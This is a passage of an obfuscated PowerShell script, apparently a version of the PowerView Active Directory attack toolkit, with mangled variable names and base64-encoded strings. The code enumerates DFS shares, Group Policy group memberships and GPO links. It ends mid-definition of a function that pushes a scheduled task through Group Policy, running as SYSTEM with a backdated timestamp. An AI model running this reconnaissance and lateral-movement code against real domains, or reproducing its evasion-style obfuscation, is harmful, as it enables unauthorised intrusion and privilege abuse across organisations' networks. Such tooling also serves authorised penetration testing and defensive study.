                        ${/=\/\_/==\_/\_/\_} = ${__/===\/\_____/=\} + 3
                        ${_____/\/\____/===} = [bitconverter]::ToUInt32(${/=\/=\/==\_/=\_/\}[${__/===\/\_____/=\}..${/=\/\_/==\_/\_/\_}],0)
                        ${__/\/==\_/\/\_/\_} = ${/=\/\_/==\_/\_/\_} + 1
                        ${_/=\_/\__/\/===\/} = ${__/\/==\_/\/\_/\_} + 7
                        ${_/=\_/\__/\/\/=\_} = ${/=\/=\/==\_/=\_/\}[${__/\/==\_/\/\_/\_}..${_/=\_/\__/\/===\/}]
                        ${_/==\/=\/=\/==\/\} = ${_/=\_/\__/\/===\/} + 1
                        ${__/\_____/=\___/\} = ${_/==\/=\/=\/==\/\} + 3
                        ${/=\/\__/\__/\___/} = [bitconverter]::ToUInt32(${/=\/=\/==\_/=\_/\}[${_/==\/=\/=\/==\/\}..${__/\_____/=\___/\}],0)
                        ${___/=\/\__/===\/\} = ${__/\_____/=\___/\} + 1
                        ${_/=\/\/=\/\__/=\/} = ${___/=\/\__/===\/\} + 3
                        ${/===\/\/\/=\/\/=\} = [bitconverter]::ToUInt32(${/=\/=\/==\_/=\_/\}[${___/=\/\__/===\/\}..${_/=\/\/=\/\__/=\/}],0)
                        ${_/==\/=\_/\/\/\/\} = ${_/=\/\/=\/\__/=\/} + 1
                        ${____/=\/=\/\_/\/\} = ${_/==\/=\_/\/\/\/\} + 1
                        ${_______/=\/===\/\} = [bitconverter]::ToUInt16(${/=\/=\/==\_/=\_/\}[${_/==\/=\_/\/\/\/\}..${____/=\/=\/\_/\/\}],0)
                        ${/===\_/=\___/==\/} = ${____/=\/=\/\_/\/\} + 1
                        ${/=\___/\_/\/\/\/\} = ${/===\_/=\___/==\/} + ${_______/=\/===\/\} - 1
                        ${/=\__________/\__} = [System.Text.Encoding]::Unicode.GetString(${/=\/=\/==\_/=\_/\}[${/===\_/=\___/==\/}..${/=\___/\_/\/\/\/\}])
                        ${/=\/\_/\____/\_/=} = ${/=\___/\_/\/\/\/\} + 1
                        ${__/===\/==\__/==\} = ${/=\/\_/\____/\_/=} + 1
                        ${__/=\/\__/\/===\/} = [bitconverter]::ToUInt16(${/=\/=\/==\_/=\_/\}[${/=\/\_/\____/\_/=}..${__/===\/==\__/==\}],0)
                        ${/=\/\__/\/=\_____} = ${__/===\/==\__/==\} + 1
                        ${/===\_/=======\_/} = ${/=\/\__/\/=\_____} + ${__/=\/\__/\/===\/} - 1
                        ${/=\__/==\_/======} = [System.Text.Encoding]::Unicode.GetString(${/=\/=\/==\_/=\_/\}[${/=\/\__/\/=\_____}..${/===\_/=======\_/}])
                        ${__/\/\__/\/\/\__/} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAvAD0AXABfAF8AXwBfAF8AXwBfAF8AXwBfAC8AXABfAF8AfQBcACQAewAvAD0AXABfAF8ALwA9AD0AXABfAC8APQA9AD0APQA9AD0AfQA=')))
                        ${__/===\___/\_/===} = ${/===\_/=======\_/} + 1
                    }
                }
            }
            ${___/\____/====\/=\} = ${_/\/\_/==\__/==\/} + 1
            ${/===\/\__/\/\/\/\} = @{
                'Name' = ${__/=\/====\__/\__}
                'Prefix' = ${__/====\/===\/===}
                'TargetList' = ${__/\/\__/\/\/\__/}
            }
            ${_/=====\___/\/==\} += New-Object -TypeName PSObject -Property ${/===\/\__/\/\/\/\}
            ${__/====\/===\/===} = $null
            ${__/=\/====\__/\__} = $null
            ${__/\/\__/\/\/\__/} = $null
        }
        ${__/\_/==\/==\_/\_} = @()
        ${_/=====\___/\/==\} | % {
            if ($_.TargetList) {
                $_.TargetList | % {
                    ${__/\_/==\/==\_/\_} += $_.split("\")[2]
                }
            }
        }
        ${__/\_/==\/==\_/\_}
    }
    function __/\/=\/==\/\/\/== {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)]
            [Int]
            $PageSize = 200,
            [Management.Automation.PSCredential]
            $Credential
        )
        ${/==\_/=\_/\_/=\__} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
        if(${/==\_/=\_/\_/=\__}) {
            ${____/=\/\/\__/=\/} = @()
            ${/==\_/=\_/\_/=\__}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
            try {
                ${__/==\/===\/\/\/=} = ${/==\_/=\_/\_/=\__}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    $Properties = $_.Properties
                    ${/==\__/===\/\/\/=} = $Properties.remoteservername
                    ${___/=\___/\_/\/\/\} = $Properties.pkt
                    ${____/=\/\/\__/=\/} += ${/==\__/===\/\/\/=} | % {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                        }
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/==\_/=\_/\_/=\__}.dispose()
                if(${___/=\___/\_/\/\/\} -and ${___/=\___/\_/\/\/\}[0]) {
                    __/\/==\/\/\_/\_/\ ${___/=\___/\_/\/\/\}[0] | % {
                        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                            New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                        }
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAEYAUwBzAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
            }
            ${____/=\/\/\__/=\/} | sort -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    function __/\_/===\/=\/=\/= {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200,
            [Management.Automation.PSCredential]
            $Credential
        )
        ${/==\_/=\_/\_/=\__} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
        if(${/==\_/=\_/\_/=\__}) {
            ${____/=\/\/\__/=\/} = @()
            ${/==\_/=\_/\_/=\__}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
            ${/==\_/=\_/\_/=\__}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
            try {
                ${__/==\/===\/\/\/=} = ${/==\_/=\_/\_/=\__}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    $Properties = $_.Properties
                    ${__/\/\__/\/\/\__/} = $Properties.'msdfs-targetlistv2'[0]
                    ${_/=\_/\_/=\_/\_/\} = [xml][System.Text.Encoding]::Unicode.GetString(${__/\/\__/\/\/\__/}[2..(${__/\/\__/\/\/\__/}.Length-1)])
                    ${____/=\/\/\__/=\/} += ${_/=\_/\_/=\_/\_/\}.targets.ChildNodes | % {
                        try {
                            ${__/\/=\_/\__/\___} = $_.InnerText
                            if ( ${__/\/=\_/\__/\___}.Contains('\') ) {
                                ${_/===\/\/==\/\___} = ${__/\/=\_/\__/\___}.split("\")[3]
                                ${__/\_/===\_/\_/=\} = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQBcAC8AXAAvAD0APQBcAC8AXABfAF8AXwB9ACQAewBfAF8ALwBcAF8ALwA9AD0APQBcAF8ALwBcAF8ALwA9AFwAfQA=')));'RemoteServerName'=${__/\/=\_/\__/\___}.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                        }
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/==\_/=\_/\_/=\__}.dispose()
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAEYAUwBzAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
            }
            ${____/=\/\/\__/=\/} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    ${____/=\/\/\__/=\/} = @()
    if ( (${___/\_/=\/\_/==\_/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or (${___/\_/=\/\_/==\_/}.endsWith("1")) ) {
        ${____/=\/\/\__/=\/} += __/\/=\/==\/\/\/== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( (${___/\_/=\/\_/==\_/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or (${___/\_/=\/\_/==\_/}.endsWith("2")) ) {
        ${____/=\/\/\__/=\/} += __/\_/===\/=\/=\/= -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    ${____/=\/\/\__/=\/} | sort -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
}
filter __/====\/====\/=\/ {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        ${___/===\_/\_/==\__},
        [Switch]
        $UsePSDrive
    )
    if($UsePSDrive) {
        ${_/====\__/=\/====} = ${___/===\_/\_/==\__}.split('\')
        ${___/\/\_____/==\_} = ${_/====\__/=\/====}[0..(${_/====\__/=\/====}.length-2)] -join '\'
        ${_/\/\_/=\_/\_/\_/} = ${_/====\__/=\/====}[-1]
        ${/=\/\/==\/=\_/\/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAewBfAF8AXwAvAD0APQA9AFwAXwAvAFwAXwAvAD0APQBcAF8AXwB9ACAAdQBzAGkAbgBnACAAYQAgAHQAZQBtAHAAIABQAFMARAByAGkAdgBlACAAYQB0ACAAJAB7AC8APQBcAC8AXAAvAD0APQBcAC8APQBcAF8ALwBcAC8APQB9AA==')))
        try {
            $Null = ndr -Name ${/=\/\/==\/=\_/\/=} -PSProvider FileSystem -Root ${___/\/\_____/==\_}  -ErrorAction Stop
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAewBfAF8AXwAvAD0APQA9AFwAXwAvAFwAXwAvAD0APQBcAF8AXwB9ACAAOgAgACQAXwA=')))
            return $Null
        }
        ${_/\/\/\__/=\/=\/=} = ${/=\/\/==\/=\_/\/=} + ":\" + ${_/\/\_/=\_/\_/\_/}
    }
    else {
        ${_/\/\/\__/=\/=\/=} = ${___/===\_/\_/==\__}
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBwAHQAVABtAHAAbABQAGEAdABoADoAIAAkAHsAXwBfAF8ALwA9AD0APQBcAF8ALwBcAF8ALwA9AD0AXABfAF8AfQA=')))
    try {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgACQAewBfAC8AXAAvAFwALwBcAF8AXwAvAD0AXAAvAD0AXAAvAD0AfQA=')))
        ${_/\/\/\__/=\/=\/=} | __/\/\/\__/=\/\___ -ErrorAction SilentlyContinue
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgACQAewBfAC8AXAAvAFwALwBcAF8AXwAvAD0AXAAvAD0AXAAvAD0AfQAgADoAIAAkAF8A')))
    }
    if($UsePSDrive -and ${/=\/\/==\/=\_/\/=}) {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAHsALwA9AFwALwBcAC8APQA9AFwALwA9AFwAXwAvAFwALwA9AH0A')))
        gdr -Name ${/=\/\/==\/=\_/\/=} -ErrorAction SilentlyContinue | rdr -Force
    }
}
filter _/==\__/===\_/\/\_ {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        ${____/\/\_/\__/===\},
        [Switch]
        $UsePSDrive
    )
    if($UsePSDrive) {
        ${_/====\__/=\/====} = ${____/\/\_/\__/===\}.split('\')
        ${___/\/\_____/==\_} = ${_/====\__/=\/====}[0..(${_/====\__/=\/====}.length-2)] -join '\'
        ${_/\/\_/=\_/\_/\_/} = ${_/====\__/=\/====}[-1]
        ${/=\/\/==\/=\_/\/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAewBfAF8AXwBfAC8AXAAvAFwAXwAvAFwAXwBfAC8APQA9AD0AXAB9ACAAdQBzAGkAbgBnACAAYQAgAHQAZQBtAHAAIABQAFMARAByAGkAdgBlACAAYQB0ACAAJAB7AC8APQBcAC8AXAAvAD0APQBcAC8APQBcAF8ALwBcAC8APQB9AA==')))
        try {
            $Null = ndr -Name ${/=\/\/==\/=\_/\/=} -PSProvider FileSystem -Root ${___/\/\_____/==\_}  -ErrorAction Stop
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAewBfAF8AXwBfAC8AXAAvAFwAXwAvAFwAXwBfAC8APQA9AD0AXAB9ACAAOgAgACQAXwA=')))
            return $Null
        }
        ${_/===\/===\_/===\} = ${/=\/\/==\/=\_/\/=} + ":\" + ${_/\/\_/=\_/\_/\_/}
    }
    else {
        ${_/===\/===\_/===\} = ${____/\/\_/\__/===\}
    }
    try {
        [XML]${__/\/\/\/\/===\/\} = gc ${_/===\/===\_/===\} -ErrorAction Stop
        ${__/\/\/\/\/===\/\} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
            $Groupname = $_.Properties.groupName
            ${/====\_/\_/==\/=\} = $_.Properties.groupSid
            if(-not ${/====\_/\_/==\/=\}) {
                if($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                    ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                }
                elseif($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                    ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                }
                elseif($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                    ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                }
                else {
                    ${/====\_/\_/==\/=\} = __/\__/=\_/\/=\___ -__/\/==\_/\___/\/\ $Groupname | select -ExpandProperty SID
                }
            }
            ${/=====\_/==\/\_/\} = $_.Properties.members | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                if($_.sid) { $_.sid }
                else { $_.name }
            }
            if (${/=====\_/==\/\_/\}) {
                if($_.filters) {
                    ${_/\/\__/\___/\__/} = $_.filters.GetEnumerator() | % {
                        New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                    }
                }
                else {
                    ${_/\/\__/\___/\__/} = $Null
                }
                if(${/=====\_/==\/\_/\} -isnot [System.Array]) { ${/=====\_/==\/\_/\} = @(${/=====\_/==\/\_/\}) }
                ${___/\_/\_/\___/\/} = New-Object PSObject
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${_/===\/===\_/===\}
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) ${_/\/\__/\___/\__/}
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${/====\_/\_/==\/=\}
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${/=====\_/==\/\_/\}
                ${___/\_/\_/\___/\/}
            }
        }
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgACQAewBfAC8APQA9AD0AXAAvAD0APQA9AFwAXwAvAD0APQA9AFwAfQAgADoAIAAkAF8A')))
    }
    if($UsePSDrive -and ${/=\/\/==\/=\_/\/=}) {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAHsALwA9AFwALwBcAC8APQA9AFwALwA9AFwAXwAvAFwALwA9AH0A')))
        gdr -Name ${/=\/\/==\/=\_/\/=} -ErrorAction SilentlyContinue | rdr -Force
    }
}
function ___/\/==\_____/\__ {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',
        [String]
        ${_/=\/\_/\__/\_/=\_},
        [String]
        $ComputerName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${/=\___/=\_____/\/} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if (${/=\___/=\_____/\/}) {
            if($ComputerName) {
                ${__/=\_/\/\_____/\} = @()
                ${____/=\/\/==\/==\} = _/=\___/=\_______/ -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
                if(!${____/=\/\/==\/==\}) {
                    throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGkAbgAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhACAAVAByAHkAIABhACAAZgB1AGwAbAB5ACAAcQB1AGEAbABpAGYAaQBlAGQAIABoAG8AcwB0ACAAbgBhAG0AZQA=')))
                }
                ${/=\_/\/\_/\/=\/\/} = @()
                ForEach(${___/==\/\/==\/=\/} in ${____/=\/\/==\/==\}) {
                    ${/==\/\/\/=\/\___/} = ${___/==\/\/==\/=\/}.distinguishedname
                    ${/=\_/\/\_/\/=\/\/} += ${/==\/\/\/=\/\___/}.split(",") | % {
                        if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                            ${/==\/\/\/=\/\___/}.substring(${/==\/\/\/=\/\___/}.indexof($_))
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AVQBzADoAIAAkAHsALwA9AFwAXwAvAFwALwBcAF8ALwBcAC8APQBcAC8AXAAvAH0A')))
                ForEach(${_/=\__/\/=\/\/===} in ${/=\_/\/\_/\/=\/\/}) {
                    ${__/=\_/\/\_____/\} += __/\/=\_/=\/==\/\_ -Domain $Domain -DomainController $DomainController -ADSpath ${_/=\__/\/=\/\/===} -FullData -PageSize $PageSize | % { 
                        write-verbose "blah: $($_.name)"
                        $_.gplink.split("][") | % {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(";")[0]
                            }
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQBzADoAIAAkAHsAXwBfAC8APQBcAF8ALwBcAC8AXABfAF8AXwBfAF8ALwBcAH0A')))
                ${/=\____/====\/\__} = (_/==\__/\_/==\_/\_ -ComputerName $ComputerName).SiteName
                if(${/=\____/====\/\__} -and (${/=\____/====\/\__} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                    ${__/=\_/\/\_____/\} += _/==\_/===\____/== -SiteName ${/=\____/====\/\__} -FullData | % {
                        if($_.gplink) {
                            $_.gplink.split("][") | % {
                                if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                    $_.split(";")[0]
                                }
                            }
                        }
                    }
                }
                ${__/=\_/\/\_____/\} | ?{$_ -and ($_ -ne '')} | % {
                    ${/=\___/=\_____/\/} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_ -PageSize $PageSize
                    ${/=\___/=\_____/\/}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABuAGEAbQBlAD0AJABHAFAATwBuAGEAbQBlACkAKQA=')))
                    try {
                        ${__/==\/===\/\/\/=} = ${/=\___/=\_____/\/}.FindAll()
                        ${__/==\/===\/\/\/=} | ? {$_} | % {
                            ${__/=\/\___/\/\/==} = ___/\/\/\_/\___/== -Properties $_.Properties
                            ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                            ${__/=\/\___/\/\/==}
                        }
                        ${__/==\/===\/\/\/=}.dispose()
                        ${/=\___/=\_____/\/}.dispose()
                    }
                    catch {
                        Write-Warning $_
                    }
                }
            }
            else {
                if(${_/=\/\_/\__/\_/=\_}) {
                    ${/=\___/=\_____/\/}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAXwAvAD0AXAAvAFwAXwAvAFwAXwBfAC8AXABfAC8APQBcAF8AfQApACkA')))
                }
                else {
                    ${/=\___/=\_____/\/}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABuAGEAbQBlAD0AJABHAFAATwBuAGEAbQBlACkAKQA=')))
                }
                try {
                    ${__/==\/===\/\/\/=} = ${/=\___/=\_____/\/}.FindAll()
                    ${__/==\/===\/\/\/=} | ? {$_} | % {
                        if($ADSPath -and ($ADSpath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            $Properties = ___/\/\/\_/\___/== -Properties $_.Properties
                            try {
                                ${/====\__/\/\/===\} = $Properties.distinguishedname
                                ${__/\__/\____/====} = ${/====\__/\/\/===\}.subString(${/====\__/\/\/===\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                ${/=\/\__/=\/=\/\_/} = "\\${__/\__/\____/====}\SysVol\${__/\__/\____/====}\Policies\$($Properties.cn)"
                                $Properties | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) ${/=\/\__/=\/=\/\_/}
                                $Properties
                            }
                            catch {
                                $Properties
                            }
                        }
                        else {
                            ___/\/\/\_/\___/== -Properties $_.Properties
                        }
                    }
                    ${__/==\/===\/\/\/=}.dispose()
                    ${/=\___/=\_____/\/}.dispose()
                }
                catch {
                    Write-Warning $_
                }
            }
        }
    }
}
function New-GPOImmediateTask {
    [CmdletBinding(DefaultParameterSetName = 'Create')]
    Param (
        [Parameter(ParameterSetName = 'Create', Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskName,
        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command = 'powershell',
        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $CommandArguments,
        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskDescription = '',
        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskAuthor = 'NT AUTHORITY\System',
        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z"),
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPOname,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPODisplayName,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $DomainController,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
